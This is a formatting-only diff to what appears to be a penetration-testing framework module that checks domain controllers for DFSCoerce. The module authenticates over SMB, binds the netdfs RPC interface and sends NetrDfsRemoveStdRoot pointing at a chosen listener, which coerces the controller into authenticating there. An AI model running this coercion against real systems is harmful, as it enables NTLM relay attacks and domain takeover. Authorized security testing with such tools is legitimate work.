@@ -11,9 +11,9 @@ from cme.logger import cme_logger
 
 
 class CMEModule:
-    name = 'dfscoerce'
+    name = "dfscoerce"
     description = "Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam"
-    supported_protocols = ['smb']
+    supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
 
@@ -27,20 +27,29 @@ class CMEModule:
         LISTENER    Listener Address (defaults to 127.0.0.1)
         """
         self.listener = "127.0.0.1"
-        if 'LISTENER' in module_options:
-            self.listener = module_options['LISTENER']
+        if "LISTENER" in module_options:
+            self.listener = module_options["LISTENER"]
 
     def on_login(self, context, connection):
         trigger = TriggerAuth()
-        dce = trigger.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain, doKerberos=connection.kerberos, dcHost=connection.kdcHost)
+        dce = trigger.connect(
+            username=connection.username,
+            password=connection.password,
+            domain=connection.domain,
+            lmhash=connection.lmhash,
+            nthash=connection.nthash,
+            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
+            doKerberos=connection.kerberos,
+            dcHost=connection.kdcHost,
+        )
 
-        if dce is not None: 
+        if dce is not None:
             context.log.debug("Target is vulnerable to DFSCoerce")
             trigger.NetrDfsRemoveStdRoot(dce, self.listener)
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/Wh04m1001/DFSCoerce")
             dce.disconnect()
-        
+
         else:
             context.log.debug("Target is not vulnerable to DFSCoerce")
 
@@ -54,9 +63,14 @@ class DCERPCSessionError(DCERPCException):
         if key in system_errors.ERROR_MESSAGES:
             error_msg_short = system_errors.ERROR_MESSAGES[key][0]
             error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
-            return 'DFSNM SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
+            return "DFSNM SessionError: code: 0x%x - %s - %s" % (
+                self.error_code,
+                error_msg_short,
+                error_msg_verbose,
+            )
         else:
-            return 'DFSNM SessionError: unknown error code: 0x%x' % self.error_code
+            return "DFSNM SessionError: unknown error code: 0x%x" % self.error_code
+
 
 ################################################################################
 # RPC CALLS
@@ -64,55 +78,57 @@ class DCERPCSessionError(DCERPCException):
 class NetrDfsRemoveStdRoot(NDRCALL):
     opnum = 13
     structure = (
-        ('ServerName', WSTR),
-        ('RootShare', WSTR),
-        ('ApiFlags', DWORD),
+        ("ServerName", WSTR),
+        ("RootShare", WSTR),
+        ("ApiFlags", DWORD),
     )
 
 
 class NetrDfsRemoveStdRootResponse(NDRCALL):
-    structure = (
-        ('ErrorCode', ULONG),
-    )
+    structure = (("ErrorCode", ULONG),)
 
 
 class NetrDfsAddRoot(NDRCALL):
     opnum = 12
     structure = (
-         ('ServerName',WSTR),
-         ('RootShare',WSTR),
-         ('Comment',WSTR),
-         ('ApiFlags',DWORD),
-     )
+        ("ServerName", WSTR),
+        ("RootShare", WSTR),
+        ("Comment", WSTR),
+        ("ApiFlags", DWORD),
+    )
 
 
 class NetrDfsAddRootResponse(NDRCALL):
-     structure = (
-         ('ErrorCode', ULONG),
-     )
+    structure = (("ErrorCode", ULONG),)
 
 
-class TriggerAuth():
+class TriggerAuth:
     def connect(self, username, password, domain, lmhash, nthash, target, doKerberos, dcHost):
-        rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\netdfs]' % target)
-        if hasattr(rpctransport, 'set_credentials'):
-            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
+        rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\PIPE\netdfs]" % target)
+        if hasattr(rpctransport, "set_credentials"):
+            rpctransport.set_credentials(
+                username=username,
+                password=password,
+                domain=domain,
+                lmhash=lmhash,
+                nthash=nthash,
+            )
 
         if doKerberos:
             rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
-        #if target:
+        # if target:
         #    rpctransport.setRemoteHost(target)
-        
+
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
-        cme_logger.debug("[-] Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % target)
+        cme_logger.debug("[-] Connecting to %s" % r"ncacn_np:%s[\PIPE\netdfs]" % target)
         try:
             dce.connect()
         except Exception as e:
             cme_logger.debug("Something went wrong, check error status => %s" % str(e))
             return
         try:
-            dce.bind(uuidtup_to_bin(('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0')))
+            dce.bind(uuidtup_to_bin(("4FC742E0-4A10-11CF-8273-00AA004AE673", "3.0")))
         except Exception as e:
             cme_logger.debug("Something went wrong, check error status => %s" % str(e))
             return
@@ -123,9 +139,9 @@ class TriggerAuth():
         cme_logger.debug("[-] Sending NetrDfsRemoveStdRoot!")
         try:
             request = NetrDfsRemoveStdRoot()
-            request['ServerName'] = '%s\x00' % listener
-            request['RootShare'] = 'test\x00'
-            request['ApiFlags'] = 1
+            request["ServerName"] = "%s\x00" % listener
+            request["RootShare"] = "test\x00"
+            request["ApiFlags"] = 1
             if self.args.verbose:
                 cme_logger.debug(request.dump())
             # logger.debug(request.dump())
